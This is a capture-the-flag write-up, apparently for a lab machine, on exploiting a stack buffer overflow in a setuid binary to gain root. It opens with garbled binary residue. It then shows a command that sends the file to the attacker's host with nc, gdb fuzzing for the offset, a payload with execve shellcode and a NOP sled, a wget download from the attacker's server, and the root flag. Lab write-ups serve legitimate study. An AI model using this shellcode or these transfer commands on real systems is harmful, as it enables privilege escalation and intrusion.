                                                                                                                            �PVL^���ohh
    k���ott z       ��      ��▒
                            ���#���@�  ������,�
                                                �
                                                ��
                                                �
                                                ������▒�▒  �0 +K0-        4▒QTh�h��       ��
    ��
    ��
    �� �
    ��
    �▒▒ ▒��
    W f    `�
    �����������
    �� � ▒pv�▒▒� �▒���Pa
    % ▒1 K��
            crtstuff.c__JCR_LIST__deregister_tm_clonesregister_tm_clones__do_global_dtors_auxcompleted.6591__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrychal.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable__x86.get_pc_thunk.bxdata_start_edata_finistrcpy@@GLIBC_2.0__data_start__gmon_start____dso_handle_IO_stdin_used__libc_start_main@@GLIBC_2.0__libc_csu_init_end_start_fp_hw__bss_startmain_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable_initthrasivoulos@Sneaky:/usr/local/bin$ 



    nc -nvlp 1234 > chal.b64 <- open listener on own machine

    base64 /usr/local/bin/chal | nc 10.10.14.10 1234 <- send file

    file chal
    chal: setuid, setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped

```
I used gdb to explploit the file (also had to chmod 600 chal)
```bat
    gdb ./chal
    GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
    Copyright (C) 2014 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
    and "show warranty" for details.
    This GDB was configured as "i686-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from ./chal...(no debugging symbols found)...done.
    (gdb) 
```
Next i did some fuzzing to find the exact point of bufferoverflow
```bat
    (gdb) r `python -c 'print("A"*100)';`
    Starting program: /usr/local/bin/chal `python -c 'print("A"*100)';`
    [Inferior 1 (process 1974) exited normally]
    (gdb) r `python -c 'print("A"*500)';`
    Starting program: /usr/local/bin/chal `python -c 'print("A"*500)';`

    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()
    (gdb) r `python -c 'print("A"*400)';`
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /usr/local/bin/chal `python -c 'print("A"*400)';`

    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()
    (gdb) r `python -c 'print("A"*300)';`
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /usr/local/bin/chal `python -c 'print("A"*300)';`
    [Inferior 1 (process 1986) exited normally]
    (gdb) r `python -c 'print("A"*350)';`
    Starting program: /usr/local/bin/chal `python -c 'print("A"*350)';`
    [Inferior 1 (process 1989) exited normally]
    (gdb) r `python -c 'print("A"*3600)';`
    Starting program: /usr/local/bin/chal `python -c 'print("A"*3600)';`

    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()
    (gdb) r `python -c 'print("A"*360)';`
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /usr/local/bin/chal `python -c 'print("A"*360)';`
    [Inferior 1 (process 1995) exited normally]
    (gdb) r `python -c 'print("A"*370)';`
    Starting program: /usr/local/bin/chal `python -c 'print("A"*370)';`

    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()
    (gdb) r `python -c 'print("A"*365)';`
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /usr/local/bin/chal `python -c 'print("A"*365)';`

    Program received signal SIGSEGV, Segmentation fault.
    0x00414141 in ?? ()
    (gdb) r `python -c 'print("A"*363)';`
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /usr/local/bin/chal `python -c 'print("A"*363)';`

    Program received signal SIGSEGV, Segmentation fault.
    0xb7e30044 in ?? () from /lib/i386-linux-gnu/libc.so.6
    (gdb) r `python -c 'print("A"*362)';`
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /usr/local/bin/chal `python -c 'print("A"*362)';`

    Program received signal SIGSEGV, Segmentation fault.
    0x00000002 in ?? ()
    (gdb) r `python -c 'print("A"*361)';`
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /usr/local/bin/chal `python -c 'print("A"*361)';`
    [Inferior 1 (process 2010) exited normally]
(gdb) r `python -c 'print("A"*361)';`
```

after a lot of trial and error I found the right eip and some shellcode to execute with the bufferoverflow
```bat
    find eip 0xbffff4c0



    payload <-
    uf_size=362
    shellcode="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    nop_sled="\x90"*(buf_size-len(shellcode))
    EIP="\xc0\xf4\xff\xbf" # 0xbffff4c0

    payload= nop_sled + shellcode + EIP
    print payload
    
    
    
    send to machine with sudo python3 -m http.server
    wget 10.10.14.10:8000/hack.py

    thrasivoulos@Sneaky:~$ wget 10.10.14.10:8000/hack.py
    --2020-11-09 18:00:36--  http://10.10.14.10:8000/hack.py
    Connecting to 10.10.14.10:8000... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 410 [text/plain]
    Saving to: ‘hack.py’

    100%[=================================================================================================================================================>] 410         --.-K/s   in 0s      

    2020-11-09 18:00:36 (69.9 MB/s) - ‘hack.py’ saved [410/410]

    thrasivoulos@Sneaky:~$ chal $(python hack.py)
    # whoami
    root
    # ls
    hack.py  index.html  user.txt
    # cd root
    sh: 3: cd: can't cd to root
    # cd /root
    # ls
    root.txt
    # cat root.txt
    c5153d86cb175a9d5d9a5cc81736fb33
    ```